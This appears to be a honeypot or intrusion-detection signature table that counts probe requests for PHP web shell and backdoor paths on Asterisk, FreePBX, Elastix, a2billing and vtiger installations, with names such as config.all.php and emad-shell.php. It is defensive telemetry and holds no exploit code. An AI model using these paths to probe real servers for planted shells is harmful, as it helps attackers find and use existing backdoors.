Signature,Spots,Hits
/admin/themes/config.all.php,1,6
/nwebmail/config.all.php,1,6
/recordings/.3305b4a4dacef87aefc095a8dda66a8a.php,1,6
/recordings.old/config.all.php,1,6
/config.all.php,1,6
/api.php,1,6
/panel/config.all.php,1,6
/panel/dhtml/config.all.php,1,6
/widgets/config.all.php,1,6
/recordings/locale/bg_BG/LC_MESSAGES/config.all.php,1,6
/recordings/modules/config.all.php,1,6
/phpversions.php,1,6
/components/config.all.php,1,6
/adminconfig.all.php,1,6
/tests/config.all.php,1,6
/libs/config.all.php,1,6
/admin/images/config.all.php,1,6
/_asterisk/index.php,1,6
/admin/common/config.all.php,1,6
/help/config.all.php,1,6
/framework/config.all.php,1,6
/recordings/theme/config.all.php,1,6
/aastra/config.all.php,1,6
/admin/helpers/config.all.php,1,6
/recordings/lol.php,1,6
/STC_VoIP_PIN/config.all.php,1,6
/a2billing/common/lib/jpgraph_lib/config.all.php,1,6
/controllers/config.all.php,1,6
/vtigercrm/z.php,1,6
/admin/.3305b4a4dacef87aefc095a8dda66a8a.php,1,6
/vtigercrm/phpversions.php,1,6
/admin/cdr/config.all.php,1,6
/recordings/config.all.php,1,6
/admin/modules/config.all.php,1,6
/recordings/.tika.php,1,6
/panel/init/config.all.php,1,6
/mail/config.all.php,1,6
/images/config.all.php,1,6
/include/config.all.php,1,6
/a2billing/common/images/config.all.php,1,6
/_asterisk/a7a.php,1,6
/recordings/miscconfig.all.php,1,6
/var/config.all.php,1,6
/panel/ming-source/config.all.php,1,6
/graph.php,1,6
/recordings/graph.php,1,6
/recordings/page.framework.php,1,6
/recordings/phpversions.php,1,6
/vtigercrm/graph.php,1,6
/templates_c/config.all.php,1,6
/a2billing/common/lib/pqp/config.all.php,1,6
/_asterisk/config.all.php,1,6
/recordings/locale/config.all.php,1,6
/temp/config.all.php,1,6
/_asterisk/MeSSi.php,1,6
/cisco/config.all.php,1,6
/admin/i18n/config.all.php,1,6
/panel/flash/config.all.php,1,6
/admin/assets/config.all.php,1,6
/admin/modules/ucp/htdocs/config.all.php,1,6
/recordings/s.php,1,6
/k12/config.all.php,1,6
/.3305b4a4dacef87aefc095a8dda66a8a.php,1,6
/vtigercrm/ml.php,1,6
/web-meetme/config.all.php,1,6
/admin/config.all.php,1,6
/a2billing/common/javascript/config.all.php,1,6
/recordings/includes/config.all.php,1,6
/a2billing/config.all.php,1,6
/recordings/locale/bg_BG/config.all.php,1,6
/lang/config.all.php,1,6
/favicon.ico,1,6
/elastixConnection/config.all.php,1,5
/modules/config.all.php,1,5
/classes/config.all.php,1,5
/mobrise/config.all.php,1,5
/js/config.all.php,1,5
/configs/config.all.php,1,5
/digium_phones/config.all.php,1,5
/xmlservices/config.all.php,1,5
/yii/config.all.php,1,5
/vtigercrm/config.all.php,1,5
/api/jsonws/invoke,1,4
/login.cgi.php,1,3
/var/tika.php,1,3
/vtigercrm/saky.php,1,3
/recordings/Ultimatex.php,1,3
/recordings/Hima.php,1,3
/ssh.php,1,3
/vtigercrm/xml.php,1,3
/test.php,1,3
/vtigercrm/Himaa.php,1,3
/recordings/ops.php,1,3
/wav.php,1,3
/vtigercrm/a7a.php,1,3
/recordings/emad-shell.php,1,3
/vtigercrm/3Zz.php,1,3
/recordings/play_page.php,1,3
/recordings/emad.php,1,3
/recordings/scan.php,1,3
/panel/main.php.1,1,3
/falx.php,1,3
/admin/xml.php,1,3
